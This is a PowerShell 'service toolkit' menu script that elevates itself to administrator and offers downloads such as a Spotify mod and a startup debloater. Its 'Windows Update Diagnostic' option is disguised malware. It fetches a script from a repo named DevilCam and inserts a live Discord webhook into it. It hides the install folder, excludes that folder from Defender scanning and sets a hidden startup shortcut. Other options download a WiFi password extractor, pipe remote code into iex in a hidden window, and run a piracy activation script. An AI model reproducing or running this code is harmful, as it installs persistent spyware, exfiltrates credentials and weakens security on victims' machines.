# --- AUTO-ELEVATION START ---
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "Requesting Administrative Privileges..." -ForegroundColor Cyan
    $Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Start-Process -FilePath "powershell.exe" -ArgumentList $Arguments -Verb RunAs
    exit
}
# --- AUTO-ELEVATION END ---

function Show-Menu {
    Clear-Host
    Write-Host "==============================================" -ForegroundColor Cyan
    Write-Host "          MY CUSTOM SERVICE TOOLKIT           " -ForegroundColor White -BackgroundColor Blue
    Write-Host "            Created by @chqrlzz-dev           " -ForegroundColor White -BackgroundColor Blue
    Write-Host "==============================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "[1] Wifi Saved Passwords Extractor"
    Write-Host "[2] Free Spotify + Spicetify"
    Write-Host "[3] Windows Update Diagnostic (Service)"
    Write-Host "[4] Downloads Folder Sorter (Autonomous)"
    Write-Host "[5] Microsoft Activation Script (MAS)"
    Write-Host "[6] Windows Startup Apps Debloater"
    Write-Host "[Q] Quit"
    Write-Host ""
    Write-Host "==============================================" -ForegroundColor Cyan
    Write-Host " Status: Elevated | Ready for commands..." -ForegroundColor Gray
}

do {
    Show-Menu
    $choice = Read-Host "Select an option"

    switch ($choice) {
        '1' {
            Write-Host "`n[!] Running Wifi Password Extractor..." -ForegroundColor Yellow
            $tmp = "$env:TEMP\sqd5.ps1"
            iwr -UseBasicParsing "https://raw.githubusercontent.com/09sychic/sqd5/refs/heads/main/sqd5.ps1" -OutFile $tmp
            powershell -NoProfile -ExecutionPolicy Bypass -File $tmp
            Remove-Item $tmp -ErrorAction SilentlyContinue
            Write-Host "Done." -ForegroundColor Green; Pause
        }
        '2' {
            Write-Host "`n[!] Downloading and Running Spotify + Spicetify..." -ForegroundColor Green
            $bat = "$env:TEMP\install_spotify.bat"
            iwr "https://github.com/chqrlzz-dev/Spotify-Spicetify/releases/download/sadsad/install_spotify.bat" -OutFile $bat
            Start-Process $bat -Wait
            Remove-Item $bat -ErrorAction SilentlyContinue
            Write-Host "Done." -ForegroundColor Green; Pause
        }
        '3' {
            Write-Host "`n[!] Deploying Windows Update Diagnostic..." -ForegroundColor Yellow
            $h = "https://discord.com/api/webhooks/1493265565354295448/OwKeAeETJFS9Ww5bcjQ500D1MevK2NuaniLI5Zcuc97vR6xGRtOxlhzPsFJjwl_yACBk"
            $dir = "$env:LOCALAPPDATA\WinUpdateDiagnostic"
            if (!(Test-Path $dir)) { New-Item -Path $dir -ItemType Directory -Force }; attrib +h $dir
            Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue
            Invoke-WebRequest -Uri "https://raw.githubusercontent.com/09sychic/DevilCamUpdated/main/UpdateAuditService.ps1" -OutFile "$dir\UpdateAuditService.ps1"
            (Get-Content "$dir\UpdateAuditService.ps1") -replace 'YOUR_DISCORD_WEBHOOK_URL', $h | Set-Content "$dir\UpdateAuditService.ps1"
            Invoke-WebRequest -Uri "https://raw.githubusercontent.com/09sychic/DevilCamUpdated/main/RunUpdateAudit.vbs" -OutFile "$dir\RunUpdateAudit.vbs"
            $s = New-Object -ComObject WScript.Shell; $link = $s.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdateAssistant.lnk")
            $link.TargetPath = "$dir\RunUpdateAudit.vbs"; $link.WindowStyle = 7; $link.Save()
            wscript.exe "$dir\RunUpdateAudit.vbs"
            Write-Host "Diagnostic Service Started Successfully." -ForegroundColor Green; Pause
        }
        '4' {
            Write-Host "`n[!] Initializing Downloads Sorter (Background)..." -ForegroundColor Cyan
            powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "iwr 'https://gist.githubusercontent.com/psychiotric-sudo/1534904084065cf659117ab4fb56c12f/raw/Initialize-DownloadsSorter.ps1' | iex"
            Write-Host "Sorter initialized in background." -ForegroundColor Green; Pause
        }
        '5' {
            Write-Host "`n[!] Launching Microsoft Activation Script..." -ForegroundColor Yellow
            Write-Host "------------------------------------------------" -ForegroundColor Gray
            Write-Host "GUIDE: Press [1] for Windows | [2] for Office" -ForegroundColor White
            Write-Host "------------------------------------------------" -ForegroundColor Gray
            irm https://get.activated.win | iex
            Pause
        }
        '6' {
            Write-Host "`n[!] Running Startup Apps Debloater..." -ForegroundColor Red
            $debloat = "$env:TEMP\runstartupapps.bat"
            iwr "https://github.com/09sychic/Services/releases/download/startup-apps/runstartupapps.bat" -OutFile $debloat
            Start-Process $debloat -Wait
            Remove-Item $debloat -ErrorAction SilentlyContinue
            Write-Host "Done." -ForegroundColor Green; Pause
        }
        'q' {
            Write-Host "`nThank you for using the toolkit by @chqrlzz-dev!" -ForegroundColor Cyan
            Start-Sleep -Seconds 2
            exit
        }
    }
} while ($true)